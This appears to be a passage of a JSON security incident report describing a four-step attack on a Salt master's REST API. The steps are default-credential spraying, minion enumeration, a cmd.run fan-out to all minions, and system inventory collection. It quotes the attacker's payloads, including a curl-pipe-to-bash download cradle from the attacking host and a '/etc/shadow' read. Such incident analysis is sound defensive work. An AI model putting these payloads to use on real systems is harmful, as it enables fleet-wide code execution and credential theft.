  "severity": "critical",
  "network_observations": [
    {"ip": "10.108.57.184", "inferred_role": "unauthorized_source_salt_api_abuse", "first_seen": "2026-05-13T09:14:07+0200", "last_seen": "2026-05-13T09:22:41+0200"},
    {"ip": "10.108.57.50", "inferred_role": "salt_master_targeted", "first_seen": "2026-05-13T09:14:07+0200", "last_seen": "2026-05-13T09:22:41+0200"}
  ],
  "attack_progression": [
    {"step": 1, "tactic": "Credential Access — Brute Force / Default Credentials", "technique": "T1110.001", "what_happened": "At 2026-05-13 09:14:07 CEST, the Salt master 10.108.57.50 (Linux host, Wazuh agent salt-master-01) logged a burst of REST API authentication attempts on the cherrypy netapi listener (data.dstport 8080). data.srcip 10.108.57.184 — a host with no operational reason to talk to the Salt master API — POSTed to /login with eauth=pam, cycling through username/password pairs salt:salt, admin:admin, saltapi:saltapi, salt:password, root:root. Salt master records every attempt with the source IP even on auth failure. Wazuh rule 92794 'Salt master API auth from unknown IP' [T1110.001] fired on the credential-spray shape.", "chain_reason": "auditd on salt-master-01 captured data.audit.exe values of /usr/bin/curl issuing repeated POST requests, and the salt-api process logged 'Authentication failure of type pam' events tied to data.srcip 10.108.57.184. Rule 92794 correlated >=5 distinct credential pairs from a single non-allowlisted source IP against dstport 8080 within 60 seconds.", "first_seen": "2026-05-13T09:14:07+0200"},
    {"step": 2, "tactic": "Discovery — Fleet Enumeration", "technique": "T1018", "what_happened": "At 09:16:33 CEST, the same data.srcip 10.108.57.184 issued GET requests to the Salt master REST endpoints /minions and /keys, enumerating every managed minion and its key acceptance state. This is fleet discovery: the attacker is building a target map of every host the master can command before launching the fan-out. The /keys endpoint additionally leaks which minions are pending vs accepted.", "chain_reason": "auditd data.audit.command on salt-master-01 shows curl GET to the /minions and /keys API paths from data.srcip 10.108.57.184, immediately following the Phase-1 auth burst. The narrow 2-minute gap between credential spray and enumeration is the methodical-operator signature — automated scanners do not pause to parse minion lists.", "first_seen": "2026-05-13T09:16:33+0200"},
    {"step": 3, "tactic": "Execution / Lateral Movement — Software Deployment Tools", "technique": "T1072", "what_happened": "At 09:18:55 CEST, data.srcip 10.108.57.184 POSTed to the Salt master root endpoint with the JSON payload {\"client\":\"local\",\"tgt\":\"*\",\"fun\":\"cmd.run\",\"arg\":[\"id\"]} — a cmd.run execution module call with target glob '*' meaning EVERY connected minion. This is the fan-out: one API call becomes simultaneous command execution across the entire managed fleet. A follow-up payload escalated to arg ['curl -s http://10.108.57.184/beacon.sh|bash'] — a download-and-execute cradle pushed to all minions. Wazuh rule 92795 'Salt cmd.run fan-out to all minions' [T1072] fired on the tgt='*' publish shape.", "chain_reason": "The Salt master salt-api log records the publish event with fun=cmd.run and tgt=* tied to data.srcip 10.108.57.184; auditd data.audit.command on salt-master-01 captured the salt-master worker process forking the cmd.run publish. Rule 92795 correlated a cmd.run publish with a wildcard target originating from the same non-allowlisted source IP as the Phase-1/Phase-2 activity.", "first_seen": "2026-05-13T09:18:55+0200"},
    {"step": 4, "tactic": "Collection / Exfiltration Prep — System Information Discovery", "technique": "T1082", "what_happened": "At 09:21:10 CEST, data.srcip 10.108.57.184 POSTed a final payload {\"client\":\"local\",\"tgt\":\"*\",\"fun\":\"grains.items\"} — pulling the full grains (system fact) inventory from every minion: OS, kernel, IP addresses, hardware, installed roles. Combined with the Phase-3 cmd.run, the attacker now has both arbitrary execution AND a complete system inventory of the entire Salt-managed estate. A salt CLI fallback ('salt \"*\" cmd.run id' and a 'cat /etc/shadow' probe) was also attempted from the master shell context.", "chain_reason": "salt-api log records a grains.items publish with tgt=* from data.srcip 10.108.57.184; auditd on salt-master-01 shows data.audit.exe /usr/bin/salt with data.audit.command containing 'cmd.run' and 'cat /etc/shadow' under data.audit.uid 0. The grains.items fan-out immediately after the cmd.run fan-out is the inventory-collection step that typically precedes targeted exploitation or ransomware staging.", "first_seen": "2026-05-13T09:21:10+0200"}
  ],
  "time_window": {"start": "2026-05-13T09:14:07+0200", "end": "2026-05-13T09:22:41+0200"},
